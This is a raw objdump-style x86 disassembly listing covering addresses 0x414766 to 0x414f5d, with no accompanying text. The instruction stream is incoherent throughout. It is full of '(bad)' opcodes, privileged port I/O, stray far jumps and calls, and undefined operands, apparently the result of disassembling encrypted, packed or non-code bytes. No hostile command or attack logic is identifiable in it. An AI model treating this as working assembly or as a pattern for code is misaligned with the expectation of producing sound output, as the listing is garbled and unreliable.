  414766:	adc    BYTE PTR [ebx+0x77bc449e],al
  41476c:	or     DWORD PTR [esi+0x4b3f9dc1],0x5d
  414773:	cmc    
  414774:	mov    WORD PTR [ecx+0x22],ds
  414777:	shl    DWORD PTR [ecx-0x44914a0b],cl
  41477d:	shr    BYTE PTR [ebp+0x4b],0x33
  414781:	mov    esi,0xfa777b3c
  414786:	imul   ebp,DWORD PTR [ebx+ebx*8-0x55],0x64545c6f
  41478e:	mov    esi,0x7d7ec77e
  414793:	sbb    BYTE PTR [esi],al
  414795:	jae    0x41479a
  414797:	sub    al,0x2
  414799:	jg     0x4147f7
  41479b:	push   eax
  41479c:	inc    edx
  41479d:	ja     0x414780
  41479f:	or     al,0x15
  4147a1:	outs   dx,DWORD PTR ds:[esi]
  4147a2:	xchg   ebx,eax
  4147a3:	sbb    eax,0x423df816
  4147a8:	ss and al,0xf0
  4147ab:	mov    ebp,DWORD PTR [ecx+ecx*2]
  4147ae:	and    DWORD PTR [edx],0xffffffd0
  4147b1:	add    eax,0x1145c0b9
  4147b6:	jl     0x41474f
  4147b8:	cdq    
  4147b9:	fisub  WORD PTR [edx]
  4147bb:	push   edx
  4147bc:	pop    edi
  4147bd:	xchg   ebx,eax
  4147be:	push   ebp
  4147bf:	(bad)  
  4147c0:	or     dl,BYTE PTR [eax+0x3962fd55]
  4147c6:	test   bl,ch
  4147c8:	mov    edi,0x9c1bf4b
  4147cd:	fcomp  DWORD PTR [edi+0x1b]
  4147d0:	add    DWORD PTR [edi+ebp*2-0x5cc783ac],edx
  4147d7:	mov    bl,BYTE PTR [edx-0x70]
  4147da:	jl     0x414842
  4147dc:	jae    0x4147b3
  4147de:	(bad)  
  4147df:	mov    ah,0x0
  4147e1:	mov    dl,0x68
  4147e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e4:	xchg   ebx,eax
  4147e5:	jb     0x414847
  4147e7:	jmp    0x414856
  4147e9:	fiadd  DWORD PTR [ebx]
  4147eb:	sub    BYTE PTR [edx+0x214c1014],dl
  4147f1:	cmp    DWORD PTR [esi+0x3a7645d3],eax
  4147f7:	xor    DWORD PTR [ebp+0x2e],esp
  4147fa:	mov    ebp,0x18ffc83e
  4147ff:	into   
  414800:	mov    DWORD PTR [ebp*4+0x4980a285],esp
  414807:	(bad)  
  414808:	test   eax,0x8ebf0e97
  41480d:	dec    esi
  41480e:	xor    ecx,edi
  414810:	test   bh,dh
  414812:	xchg   edx,eax
  414813:	adc    ebx,DWORD PTR [edi+0x53]
  414816:	push   0x48d3f61e
  41481b:	pop    ss
  41481c:	out    0x6,eax
  41481e:	in     eax,dx
  41481f:	xchg   ebx,ebp
  414821:	das    
  414822:	jns    0x4147fb
  414824:	retf   
  414825:	bound  ebp,QWORD PTR cs:[edx-0x3d]
  414829:	imul   ebp,DWORD PTR [eax+0x1],0xe7ee80ff
  414830:	daa    
  414831:	(bad)  
  414832:	ds pop ds
  414834:	push   edi
  414835:	packuswb mm2,mm7
  414838:	scas   al,BYTE PTR es:[edi]
  414839:	cs xchg ebx,eax
  41483b:	fwait
  41483c:	(bad)  
  41483d:	fmul   DWORD PTR [ebx]
  41483f:	je     0x41489a
  414841:	cmc    
  414842:	xchg   DWORD PTR [eax-0x35b398fa],esi
  414848:	pop    es
  414849:	cs stos BYTE PTR es:[edi],al
  41484b:	and    al,0xb4
  41484d:	fadd   DWORD PTR [eax+edi*8]
  414850:	pop    eax
  414851:	push   ds
  414852:	and    al,0xc0
  414854:	cmp    edi,DWORD PTR ds:0x43390a10
  41485a:	mov    dh,bh
  41485c:	dec    eax
  41485d:	sahf   
  41485e:	xor    esp,DWORD PTR [ecx+eax*8]
  414861:	inc    eax
  414862:	or     ebx,DWORD PTR ds:0xb067895c
  414868:	les    esi,FWORD PTR [edx+0x2a94edf4]
  41486e:	lahf   
  41486f:	mov    bl,0x18
  414871:	or     BYTE PTR [esi+0x20378429],al
  414877:	imul   esi,DWORD PTR [edx+0x2c],0xc256964a
  41487e:	add    al,0x69
  414880:	std    
  414881:	pop    ecx
  414882:	ds in  eax,0x50
  414885:	pop    ds
  414886:	xor    al,BYTE PTR [ecx+0x1619d4d3]
  41488c:	popa   
  41488d:	pop    edi
  41488e:	push   eax
  41488f:	add    al,dh
  414891:	xor    eax,0x2ff3ed42
  414896:	push   ebp
  414897:	(bad)  
  414898:	pop    ds
  414899:	cmp    eax,0xcb94fb47
  41489e:	adc    dl,BYTE PTR [ebx+0x3]
  4148a1:	dec    ebp
  4148a2:	xchg   edx,eax
  4148a3:	stos   DWORD PTR es:[edi],eax
  4148a4:	mov    ecx,0x9e9c9d3
  4148a9:	cld    
  4148aa:	retf   0xe74b
  4148ad:	ds pop edx
  4148af:	mov    al,ds:0xd3a1c7e6
  4148b4:	mov    dh,0x2f
  4148b6:	scas   eax,DWORD PTR es:[edi]
  4148b7:	and    BYTE PTR [ebx-0x6123c25b],dh
  4148bd:	(bad)  
  4148be:	and    al,BYTE PTR [edx]
  4148c0:	add    edi,DWORD PTR [ebx-0xd2b8a07]
  4148c6:	push   ds
  4148c7:	mov    ebx,0x99b3f0d3
  4148cc:	sub    al,0xd6
  4148ce:	or     BYTE PTR [esp+ecx*4+0x228fd4d8],bl
  4148d5:	jae    0x414953
  4148d7:	cmp    BYTE PTR [esi],dl
  4148d9:	mov    al,0x6f
  4148db:	jo     0x4148d5
  4148dd:	test   BYTE PTR [ebx+0x61b3db56],dh
  4148e3:	das    
  4148e4:	inc    eax
  4148e5:	cwde   
  4148e6:	mov    bl,0xf6
  4148e8:	addr16 loopne 0x41491f
  4148eb:	repnz iret 
  4148ed:	in     al,0x83
  4148ef:	xchg   ebp,eax
  4148f0:	cmp    DWORD PTR ds:0x4c6692ed,ecx
  4148f6:	pop    es
  4148f7:	and    al,0x40
  4148f9:	push   es
  4148fa:	pop    ss
  4148fb:	shl    ecx,0xbe
  4148fe:	popf   
  4148ff:	and    dh,BYTE PTR [edi-0x3b029f95]
  414905:	aam    0xf
  414907:	xchg   esp,eax
  414908:	push   ebp
  414909:	idiv   BYTE PTR [edx+0x603ddd38]
  41490f:	ins    DWORD PTR es:[edi],dx
  414910:	imul   eax,DWORD PTR [edi+edi*1],0x732afdbe
  414917:	cli    
  414918:	lds    ebx,FWORD PTR [edx-0x65b9c455]
  41491e:	mov    esp,0x89d62d91
  414923:	xchg   esi,eax
  414924:	sbb    ebx,edx
  414926:	push   edx
  414927:	aaa    
  414928:	mov    al,0xca
  41492a:	or     esi,DWORD PTR [edx-0x1960cae8]
  414930:	adc    eax,eax
  414932:	stc    
  414933:	fcomp  st(2)
  414935:	sbb    ebp,DWORD PTR ds:0x98df9c41
  41493b:	jne    0x4149aa
  41493d:	cmc    
  41493e:	popa   
  41493f:	xlat   BYTE PTR ds:[ebx]
  414940:	adc    bh,BYTE PTR [ebp-0x14]
  414943:	(bad)  
  414944:	scas   al,BYTE PTR es:[edi]
  414945:	cmp    eax,DWORD PTR [edx+0x201ffc6]
  41494b:	adc    eax,0xf2302c51
  414950:	nop
  414951:	jno    0x4148dc
  414953:	pop    esi
  414954:	mov    ah,0xf5
  414956:	pop    esi
  414957:	jno    0x41494d
  414959:	repz dec edx
  41495b:	cmc    
  41495c:	(bad)  
  41495d:	rcl    BYTE PTR [edx-0x29],1
  414960:	sub    edi,ecx
  414962:	mov    bl,0xbc
  414964:	(bad)  
  414965:	and    al,0x30
  414967:	lds    ebp,FWORD PTR [edx-0x7c0d2aef]
  41496d:	mov    dl,0x5a
  41496f:	push   0xd401ed0d
  414974:	cmp    DWORD PTR [edx+0x44],ebp
  414977:	add    edx,ebp
  414979:	mov    BYTE PTR [edi+0x6972ecb1],dl
  41497f:	push   esp
  414980:	lea    ebx,[ecx-0x2f3005d9]
  414986:	fdivp  st(6),st
  414988:	stos   DWORD PTR es:[edi],eax
  414989:	or     BYTE PTR [edx+0x299ffc4e],bh
  41498f:	dec    edx
  414990:	mov    ah,0x2a
  414992:	aaa    
  414993:	dec    ebx
  414994:	sub    BYTE PTR [edi],ch
  414996:	inc    eax
  414997:	icebp  
  414998:	adc    esp,DWORD PTR [ebx]
  41499a:	icebp  
  41499b:	repz pop edi
  41499d:	enter  0x55f8,0x2
  4149a1:	lea    esi,[ebx+edi*8+0x4c]
  4149a5:	(bad)  
  4149a6:	or     al,0xff
  4149a8:	push   0xffffff87
  4149aa:	dec    edx
  4149ab:	pop    ss
  4149ac:	mov    WORD PTR [edx],es
  4149ae:	mov    dh,0x6c
  4149b0:	xor    ch,ch
  4149b2:	jmp    0x50f7:0xbb590485
  4149b9:	push   esi
  4149ba:	enter  0x394a,0x2c
  4149be:	popf   
  4149bf:	mov    BYTE PTR [eax],bl
  4149c1:	les    edi,FWORD PTR [esi-0x14]
  4149c4:	add    BYTE PTR [ebp-0x5a0ae83a],dl
  4149ca:	and    al,0x7b
  4149cc:	jl     0x414a47
  4149ce:	xchg   BYTE PTR [edx],cl
  4149d0:	shl    esi,1
  4149d2:	jle    0x414989
  4149d4:	adc    eax,0xcccfb9dc
  4149d9:	dec    edi
  4149da:	int    0xd7
  4149dc:	call   0x2e9e0742
  4149e1:	mov    edx,0x3254b018
  4149e6:	xor    ch,BYTE PTR [ebx-0x49]
  4149e9:	mov    ds:0x2d4f105c,eax
  4149ee:	(bad)  
  4149ef:	loopne 0x4149f4
  4149f1:	clc    
  4149f2:	popf   
  4149f3:	push   eax
  4149f4:	int3   
  4149f5:	push   0xffffffbc
  4149f7:	sbb    DWORD PTR [edi],eax
  4149f9:	(bad)  
  4149fa:	push   edi
  4149fb:	inc    ebp
  4149fc:	and    ebp,ebx
  4149fe:	(bad)  
  4149ff:	icebp  
  414a00:	xchg   edi,eax
  414a01:	or     BYTE PTR [ebx-0x1b],dh
  414a04:	cmp    DWORD PTR [ebp-0x47f22fe2],edx
  414a0a:	inc    esp
  414a0b:	call   0xc8c60e81
  414a10:	fist   WORD PTR [ebx]
  414a12:	outs   dx,DWORD PTR ds:[esi]
  414a13:	stc    
  414a14:	sbb    eax,0x43ee894e
  414a19:	mov    edx,0xdee38c2
  414a1e:	push   esp
  414a1f:	mov    al,ds:0x648c442b
  414a24:	mov    al,ds:0xd80a4b8d
  414a29:	outs   dx,DWORD PTR ds:[esi]
  414a2a:	sub    BYTE PTR [edx-0x14],bh
  414a2d:	loopne 0x414a6f
  414a2f:	add    eax,0x2759fa6d
  414a34:	ret    0xd4a3
  414a37:	xor    eax,0x2d711e5f
  414a3c:	dec    esp
  414a3d:	or     al,0xc5
  414a3f:	mov    bh,0x32
  414a41:	out    dx,al
  414a42:	mov    ah,0xd1
  414a44:	mov    cl,0x9
  414a46:	mov    cl,0x7
  414a48:	cwde   
  414a49:	jmp    0x414a1a
  414a4b:	and    ebp,esp
  414a4d:	loope  0x414a3b
  414a4f:	mov    eax,ds:0x595cd672
  414a54:	inc    esp
  414a55:	inc    ebp
  414a56:	ret    0xbe72
  414a59:	lea    eax,[ecx-0x21]
  414a5c:	mov    bl,BYTE PTR [edx]
  414a5e:	xchg   ecx,eax
  414a5f:	sbb    DWORD PTR [esi+0x5f],ebp
  414a62:	scas   al,BYTE PTR es:[edi]
  414a63:	mov    esp,0xe78a4e2f
  414a68:	out    0x7f,eax
  414a6a:	jb     0x414ac8
  414a6c:	and    al,BYTE PTR [ebx+0x20]
  414a6f:	mov    ebx,0x6b1385f8
  414a74:	adc    BYTE PTR [ebx],0xdc
  414a77:	cmp    bh,BYTE PTR [eax+eax*8-0x34de0a0]
  414a7e:	(bad)  
  414a7f:	aad    0xae
  414a81:	push   ecx
  414a82:	mov    cl,0x90
  414a84:	and    BYTE PTR [esi-0x39],bh
  414a87:	in     eax,dx
  414a88:	cmp    BYTE PTR fs:[edx],0x16
  414a8c:	jb     0x414af8
  414a8e:	and    bh,dh
  414a90:	imul   edi,DWORD PTR [ecx],0x43
  414a93:	xchg   DWORD PTR [esi-0x32],esp
  414a96:	cld    
  414a97:	jl     0x414ad6
  414a99:	xchg   edi,eax
  414a9a:	ret    
  414a9b:	mov    eax,0xdf3e8e3
  414aa0:	in     eax,dx
  414aa1:	popf   
  414aa2:	inc    ebx
  414aa3:	or     eax,0x924824e6
  414aa8:	mov    WORD PTR [ebx],fs
  414aaa:	lea    ebx,[ebp-0x76]
  414aad:	adc    dl,0xd0
  414ab0:	mov    WORD PTR [edx],?
  414ab2:	aas    
  414ab3:	daa    
  414ab4:	inc    edx
  414ab5:	pop    ebp
  414ab6:	add    DWORD PTR [eax-0x1c],ebp
  414ab9:	xchg   esp,eax
  414aba:	xor    DWORD PTR [edi-0x2a47860b],0x27
  414ac1:	pop    edx
  414ac2:	sub    BYTE PTR [esi+0x33],0xa5
  414ac6:	test   DWORD PTR [ecx+esi*1-0x1d],esp
  414aca:	pop    ecx
  414acb:	bound  eax,QWORD PTR [ecx+esi*8]
  414ace:	jnp    0x414b03
  414ad0:	inc    ebx
  414ad1:	call   0x8ef:0x53148868
  414ad8:	imul   eax,DWORD PTR [ebx+eiz*1-0x32],0xcad27d6c
  414ae0:	push   cs
  414ae1:	stos   DWORD PTR es:[edi],eax
  414ae2:	jae    0x414af9
  414ae4:	icebp  
  414ae5:	in     eax,dx
  414ae6:	add    dh,BYTE PTR [ebx-0x6e]
  414ae9:	inc    ebp
  414aea:	mov    al,ds:0xb5989eb3
  414aef:	ret    0x9a86
  414af2:	push   cs
  414af3:	dec    eax
  414af4:	push   ebp
  414af5:	mov    esp,0x2f2b4c15
  414afa:	mov    eax,ds:0xf1219611
  414aff:	call   0x5bf1:0x4e61ebb8
  414b06:	fs leave 
  414b08:	jmp    0x223:0x72950818
  414b0f:	push   cs
  414b10:	jecxz  0x414b4f
  414b12:	lea    edx,ds:0x2ca55c71
  414b18:	rcr    esi,0x21
  414b1b:	outs   dx,BYTE PTR ss:[esi]
  414b1d:	lds    eax,FWORD PTR [ebx+eiz*4+0x194ac91]
  414b24:	push   esi
  414b25:	ins    DWORD PTR es:[edi],dx
  414b26:	loope  0x414afd
  414b28:	add    al,BYTE PTR [edx+0x294215b]
  414b2e:	mov    al,BYTE PTR [ebp+0x7d513af8]
  414b34:	sbb    ebp,ebp
  414b36:	xor    DWORD PTR [eax+0x50],ebp
  414b39:	jmp    0x536dafd6
  414b3e:	mov    dl,bh
  414b40:	jle    0x414b7a
  414b42:	push   esp
  414b43:	mov    al,ds:0x4f313e9a
  414b48:	cmp    eax,0x74fb66aa
  414b4d:	push   esp
  414b4e:	cld    
  414b4f:	nop
  414b50:	xchg   edi,eax
  414b51:	adc    bh,BYTE PTR [ecx]
  414b53:	and    DWORD PTR [ebx+0x524755f7],0xffffffa8
  414b5a:	cmp    BYTE PTR [ecx],dl
  414b5c:	jl     0x414ade
  414b5e:	aad    0x46
  414b60:	ror    DWORD PTR [esp+esi*2],cl
  414b63:	(bad)  
  414b64:	sahf   
  414b65:	icebp  
  414b66:	xchg   edx,eax
  414b67:	sbb    BYTE PTR [esi+edx*8-0xd],ah
  414b6b:	push   ecx
  414b6c:	and    BYTE PTR [edx+0x5e62db04],0xcd
  414b73:	ins    DWORD PTR es:[edi],dx
  414b74:	and    cl,BYTE PTR [ecx-0x416bb46e]
  414b7a:	sahf   
  414b7b:	(bad)  
  414b7f:	push   0x10
  414b81:	call   0x5310:0x7680de33
  414b88:	mov    ?,WORD PTR [eax]
  414b8a:	icebp  
  414b8b:	imul   ebx,DWORD PTR [edx],0x93bacaeb
  414b91:	jo     0x414c00
  414b93:	xor    dl,BYTE PTR [ebx+0x3]
  414b96:	loope  0x414b30
  414b98:	mov    ds:0x4ea57588,eax
  414b9d:	add    DWORD PTR [ebp-0x44],edx
  414ba0:	push   es
  414ba1:	scas   eax,DWORD PTR es:[edi]
  414ba2:	sbb    BYTE PTR ds:0x9857161e,cl
  414ba8:	cmp    al,0xcf
  414baa:	test   bl,ah
  414bac:	test   BYTE PTR [edx],cl
  414bae:	mov    cl,0x1e
  414bb0:	das    
  414bb1:	jns    0x414b4e
  414bb3:	and    DWORD PTR [ebp-0x63],ebx
  414bb6:	fisubr WORD PTR [ebp+0x7a]
  414bb9:	mov    edi,0xe9f2822a
  414bbe:	(bad)  
  414bbf:	shr    DWORD PTR [ebx+0x7f],1
  414bc2:	sub    ch,bl
  414bc4:	dec    ebp
  414bc5:	mov    esp,0x843631ce
  414bca:	mov    al,ds:0xadbb6b0e
  414bcf:	int3   
  414bd0:	popa   
  414bd1:	xlat   BYTE PTR ds:[ebx]
  414bd2:	addr16 inc esp
  414bd4:	sub    eax,DWORD PTR [ebp+eiz*2-0x7c]
  414bd8:	rcl    ch,cl
  414bda:	and    edx,DWORD PTR [edx-0x7a4ea5b4]
  414be0:	ret    
  414be1:	sub    ah,bl
  414be3:	in     al,dx
  414be4:	and    DWORD PTR [eax-0x78],esi
  414be7:	ss int3 
  414be9:	sti    
  414bea:	cmp    ah,BYTE PTR [ebx-0x5be6f268]
  414bf0:	jno    0x414be5
  414bf2:	shr    dl,1
  414bf4:	dec    esp
  414bf5:	cmp    eax,0x5ffe0c6c
  414bfa:	test   eax,0x773b74bf
  414bff:	mov    ?,WORD PTR [ecx]
  414c01:	in     eax,0x0
  414c03:	add    eax,edi
  414c05:	out    0xca,al
  414c07:	jg     0x414be9
  414c09:	mov    DWORD PTR [ecx],esi
  414c0b:	mov    edi,0xb7d32270
  414c10:	mov    WORD PTR [esi+0x62a1a2fd],?
  414c16:	in     eax,dx
  414c17:	sub    BYTE PTR [esi-0x1b5f4226],0x50
  414c1e:	out    0x57,eax
  414c20:	push   cs
  414c21:	push   cs
  414c22:	rcr    BYTE PTR [edx-0x2],1
  414c25:	or     BYTE PTR [ecx],0xc1
  414c28:	xchg   DWORD PTR [eax],eax
  414c2a:	lahf   
  414c2b:	inc    esp
  414c2c:	add    al,0x89
  414c2e:	xor    eax,0x85a35e62
  414c33:	inc    esp
  414c34:	bound  ecx,QWORD PTR [ebp-0x381d3e32]
  414c3a:	scas   al,BYTE PTR es:[edi]
  414c3b:	push   cs
  414c3c:	add    eax,0xf310b51c
  414c41:	int3   
  414c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c43:	sbb    bh,BYTE PTR [esi+0x75]
  414c46:	mov    edx,DWORD PTR [eax+0x4f]
  414c49:	pop    esp
  414c4a:	outs   dx,DWORD PTR ds:[esi]
  414c4b:	push   cs
  414c4c:	cmp    esp,DWORD PTR [ebx+0x65916d1c]
  414c52:	outs   dx,DWORD PTR ds:[esi]
  414c53:	sub    BYTE PTR [ebp+0x65a79285],0x36
  414c5a:	in     eax,dx
  414c5b:	lock adc DWORD PTR [edi+0x61],ebp
  414c5f:	mov    ebp,0xd11c57ca
  414c64:	mov    al,ds:0x708286f5
  414c69:	dec    ecx
  414c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c6b:	rcr    DWORD PTR [ebp+edi*2-0x549753c6],0x46
  414c73:	into   
  414c74:	adc    eax,0x66a4b68
  414c79:	imul   ecx,DWORD PTR [esi],0x3b423ebf
  414c7f:	stos   BYTE PTR es:[edi],al
  414c80:	fisttp QWORD PTR [ecx+0x705706c0]
  414c86:	dec    esp
  414c87:	mov    bh,0xf0
  414c89:	out    dx,al
  414c8a:	fwait
  414c8b:	pop    edi
  414c8c:	retf   0x2e25
  414c8f:	cdq    
  414c90:	cwde   
  414c91:	out    0x8e,eax
  414c93:	mov    eax,0xd2aacdb
  414c98:	xchg   ebp,eax
  414c99:	mov    ecx,0x26141d70
  414c9e:	and    eax,eax
  414ca0:	mov    al,ds:0x89f33b07
  414ca5:	xor    eax,DWORD PTR [ebx+edi*2]
  414ca8:	xchg   ebx,eax
  414caa:	fldenv [ebx]
  414cac:	jecxz  0x414cda
  414cae:	lods   al,BYTE PTR ds:[esi]
  414caf:	pop    edi
  414cb0:	jns    0x414d05
  414cb2:	outs   dx,BYTE PTR ds:[esi]
  414cb3:	stc    
  414cb4:	jbe    0xeae50644
  414cba:	leave  
  414cbb:	fcomp  QWORD PTR [esi-0x2669cb62]
  414cc1:	aad    0x5c
  414cc3:	inc    eax
  414cc4:	mov    ah,0xf4
  414cc6:	imul   ecx,DWORD PTR [esi],0x4a
  414cc9:	sbb    al,BYTE PTR [edi]
  414ccb:	data16 jl 0x414cd9
  414cce:	nop
  414ccf:	stos   BYTE PTR es:[edi],al
  414cd0:	fiadd  DWORD PTR [edi+0x17]
  414cd3:	lds    ebx,FWORD PTR [ebp-0x634a76a2]
  414cd9:	mov    ebx,0x1a44a428
  414cde:	xchg   ebp,eax
  414cdf:	add    BYTE PTR [ebx-0x1c],0x5e
  414ce3:	scas   eax,DWORD PTR es:[edi]
  414ce4:	int    0xa
  414ce6:	jmp    DWORD PTR [edx-0x1e]
  414ce9:	inc    esp
  414cea:	dec    edi
  414ceb:	and    al,0x62
  414ced:	test   eax,0x5bac7fe1
  414cf2:	dec    esp
  414cf3:	ss mov si,0x4081
  414cf8:	adc    edi,ebx
  414cfa:	out    dx,eax
  414cfb:	and    ecx,ebx
  414cfd:	mov    ch,0x90
  414cff:	xlat   BYTE PTR ds:[ebx]
  414d00:	adc    BYTE PTR [ecx+edi*1+0x26],0xc
  414d05:	sbb    al,0xbc
  414d07:	push   ds
  414d08:	retf   0xaa27
  414d0b:	dec    eax
  414d0c:	lahf   
  414d0d:	cwde   
  414d0e:	cli    
  414d0f:	and    esi,DWORD PTR [edi-0x1b]
  414d12:	pop    ebx
  414d13:	add    DWORD PTR [edx+0x6],0xa1408b8b
  414d1a:	mov    cl,0xee
  414d1c:	push   cs
  414d1d:	sti    
  414d1e:	xlat   BYTE PTR ds:[ebx]
  414d1f:	and    al,ch
  414d21:	shl    DWORD PTR [edx-0x26686ee4],1
  414d27:	lea    ecx,[ecx]
  414d29:	cmp    dl,ch
  414d2b:	jae    0x414d24
  414d2d:	lock xchg edi,eax
  414d2f:	pushf  
  414d30:	pop    ecx
  414d31:	scas   al,BYTE PTR es:[edi]
  414d32:	test   al,0xc1
  414d34:	dec    ecx
  414d35:	shl    bh,1
  414d37:	xor    esp,DWORD PTR [esi+0x4e]
  414d3a:	test   DWORD PTR [eax+ecx*4],0x84fbf055
  414d41:	xchg   ebp,eax
  414d42:	leave  
  414d43:	mov    bl,0xc6
  414d45:	imul   BYTE PTR [ecx]
  414d47:	cmp    eax,0x47321ada
  414d4c:	pusha  
  414d4d:	inc    edx
  414d4e:	xor    BYTE PTR [edi],ah
  414d50:	xor    eax,0x244c6a78
  414d55:	ror    BYTE PTR [edx],0xef
  414d58:	mov    ebp,0xdcad8d55
  414d5d:	outs   dx,BYTE PTR ds:[esi]
  414d5e:	jno    0x414d2f
  414d60:	imul   ebx,DWORD PTR [ebp+0x49],0xf
  414d64:	das    
  414d65:	lahf   
  414d66:	xchg   ebp,eax
  414d67:	(bad)  
  414d68:	fisubr DWORD PTR [ecx+0x14]
  414d6b:	adc    eax,0xffa8daea
  414d70:	and    ah,dl
  414d72:	inc    edx
  414d73:	pop    ebx
  414d74:	sub    cl,BYTE PTR [edi-0x38]
  414d77:	int    0xdf
  414d79:	inc    ebp
  414d7a:	jb     0x414d20
  414d7c:	int3   
  414d7d:	mov    ds,WORD PTR [edx+0xc]
  414d80:	arpl   WORD PTR [ebx],si
  414d82:	sbb    BYTE PTR [esi+0x13],0x25
  414d86:	sahf   
  414d87:	out    0x75,eax
  414d89:	cmp    BYTE PTR [ecx+0xb],ch
  414d8c:	rol    BYTE PTR [eax-0x61],1
  414d8f:	hlt    
  414d90:	mov    edx,0xe80e37a1
  414d95:	inc    ebx
  414d96:	pop    es
  414d97:	push   esp
  414d98:	inc    esi
  414d99:	dec    edx
  414d9a:	rol    BYTE PTR [ecx-0x79],cl
  414d9d:	push   ds
  414d9e:	and    BYTE PTR [edx+ebx*1-0x4a570ee4],al
  414da5:	inc    ebx
  414da6:	adc    dh,BYTE PTR [edx]
  414da8:	pop    eax
  414da9:	mov    WORD PTR [ebp-0x7a25cd07],ds
  414daf:	push   es
  414db0:	jg     0x414e24
  414db2:	xor    eax,0x1ca52ebb
  414db7:	or     eax,0x586eeaef
  414dbc:	ret    0xf6cf
  414dbf:	in     eax,0xff
  414dc1:	add    dl,BYTE PTR [edx*2+0x6c4f6004]
  414dc8:	add    esp,DWORD PTR [ebx]
  414dca:	bound  eax,QWORD PTR [ebx]
  414dcc:	(bad)  
  414dcd:	mov    dl,0x51
  414dcf:	inc    ebp
  414dd0:	xor    BYTE PTR [ebp+0x75eadbf0],dh
  414dd6:	jp     0x414dc2
  414dd8:	push   ss
  414dd9:	sub    eax,0xf78038f7
  414dde:	pop    edx
  414ddf:	jns    0x414dbf
  414de1:	rcr    edx,cl
  414de3:	cmp    BYTE PTR [edi],0x64
  414de6:	(bad)  
  414de7:	fcomp  DWORD PTR [eax+0x8]
  414dea:	enter  0x137,0xc6
  414dee:	inc    edi
  414df0:	dec    ebx
  414df1:	cs test eax,0xd2f6f67e
  414df7:	push   0x9c7ad5b4
  414dfc:	dec    ecx
  414dfd:	jl     0x414d92
  414dff:	add    BYTE PTR [esi+0x5f],dh
  414e02:	jno    0x414e74
  414e04:	xchg   esi,eax
  414e05:	imul   esp,DWORD PTR [esi],0xd596aed4
  414e0b:	xor    bh,0xca
  414e0e:	xor    ah,BYTE PTR es:[ecx+0x25]
  414e12:	and    al,0x92
  414e14:	push   eax
  414e15:	or     eax,0x18ba2489
  414e1a:	lods   eax,DWORD PTR ds:[esi]
  414e1b:	xchg   edi,eax
  414e1c:	cmp    eax,0xfaa579d2
  414e21:	int3   
  414e22:	jmp    0x943e:0x2d287d6f
  414e29:	adc    dl,bl
  414e2b:	cmp    DWORD PTR [esp+0x712ffce2],edx
  414e32:	jmp    0x99b0:0x4d0f3373
  414e39:	xorps  xmm7,XMMWORD PTR [ebp-0x794aedc0]
  414e40:	dec    esi
  414e41:	pop    ecx
  414e42:	call   0xb61e:0xbb687cf4
  414e49:	add    DWORD PTR [edi+edx*4+0x1c],0x631ebc8b
  414e51:	or     esp,DWORD PTR [ebx]
  414e53:	popf   
  414e54:	sub    ch,BYTE PTR [edi-0x7a62d9ca]
  414e5a:	test   al,0x2f
  414e5c:	jmp    0x46c2:0x20c82714
  414e63:	inc    ebx
  414e64:	mov    WORD PTR [ecx],ax
  414e67:	sahf   
  414e68:	or     DWORD PTR [esi+0x77],ebp
  414e6b:	mov    ds:0xf0b5f396,al
  414e70:	adc    ecx,DWORD PTR [eax-0x1b5fb1ae]
  414e76:	push   ebx
  414e77:	push   ebp
  414e78:	and    BYTE PTR [ebx],0x58
  414e7b:	mov    ch,0x81
  414e7d:	rcr    ch,1
  414e7f:	mov    al,0x71
  414e81:	ins    DWORD PTR es:[edi],dx
  414e82:	stos   DWORD PTR es:[edi],eax
  414e83:	rcl    BYTE PTR ds:0x713c4110,cl
  414e89:	cmp    DWORD PTR [ebx+0x3295f150],0xc401cbc9
  414e93:	cld    
  414e94:	dec    eax
  414e95:	mov    dh,0xcd
  414e97:	mov    dl,0x24
  414e99:	mov    edi,0x399e7bef
  414e9e:	sub    BYTE PTR [ecx],ch
  414ea0:	(bad)  
  414ea1:	pop    edx
  414ea2:	dec    ecx
  414ea3:	(bad)  
  414ea5:	ret    
  414ea6:	sbb    BYTE PTR [edx],0x94
  414ea9:	adc    cl,ah
  414eab:	stos   BYTE PTR es:[edi],al
  414eac:	fs push ecx
  414eae:	cs in  al,0x88
  414eb1:	sub    dh,BYTE PTR [ebp+0x2639f531]
  414eb7:	cs aaa 
  414eb9:	dec    edi
  414eba:	ins    DWORD PTR es:[edi],dx
  414ebb:	xor    BYTE PTR [ebx+ebx*2+0x3ef26b13],ah
  414ec2:	fbld   TBYTE PTR [ebx]
  414ec4:	call   0x241c:0xa89e628e
  414ecb:	and    DWORD PTR [ecx+0x62434a36],ebx
  414ed1:	call   0x3eee:0x49436710
  414ed8:	xor    BYTE PTR [esi],cl
  414eda:	retf   
  414edb:	cmp    BYTE PTR [ebp+0x15],dh
  414ede:	adc    dl,0xf4
  414ee1:	cmp    DWORD PTR [ebp+0x2ccc5f56],esi
  414ee7:	mov    DWORD PTR [ebx],eax
  414ee9:	or     al,0xe
  414eeb:	pop    ebx
  414eec:	mov    edx,0xff72fca5
  414ef1:	inc    esp
  414ef2:	repz xor eax,0x7400ede5
  414ef8:	xadd   BYTE PTR [ebp+0x39],dl
  414efc:	mov    BYTE PTR [edi],dh
  414efe:	setg   bh
  414f01:	or     ebp,DWORD PTR [ebp-0x29da3a30]
  414f07:	test   al,0xf1
  414f09:	gs stos DWORD PTR es:[edi],eax
  414f0b:	nop    esi
  414f0e:	data16 aaa 
  414f10:	sbb    DWORD PTR [ebp+0x0],ebp
  414f13:	inc    eax
  414f14:	mov    dh,0x85
  414f16:	cmp    DWORD PTR [esp+ebp*1+0x53],0x5feaf97b
  414f1e:	xchg   esi,eax
  414f1f:	dec    eax
  414f20:	cmp    eax,0x7b092d84
  414f25:	adc    esp,DWORD PTR [ecx-0x6]
  414f28:	mov    edx,0xfe87a36d
  414f2d:	imul   ecx,DWORD PTR [ecx-0x2b],0x7
  414f31:	or     esi,0xffffff8d
  414f34:	hlt    
  414f35:	addr16 jmp 0x414ed6
  414f38:	xlat   BYTE PTR ds:[ebx]
  414f39:	sub    eax,0x5a97784e
  414f3e:	push   ecx
  414f3f:	add    eax,DWORD PTR [ebp+0x5036a7d9]
  414f45:	jl     0x414f2d
  414f47:	jnp    0x414f24
  414f49:	mov    edi,0x131561f8
  414f4e:	mov    bh,0x4c
  414f50:	mov    ebp,0x409ba449
  414f55:	jno    0x414f77
  414f57:	xor    DWORD PTR [ebx-0x5d],esi
  414f5a:	pminsw mm3,QWORD PTR [eax]
  414f5d:	clc    
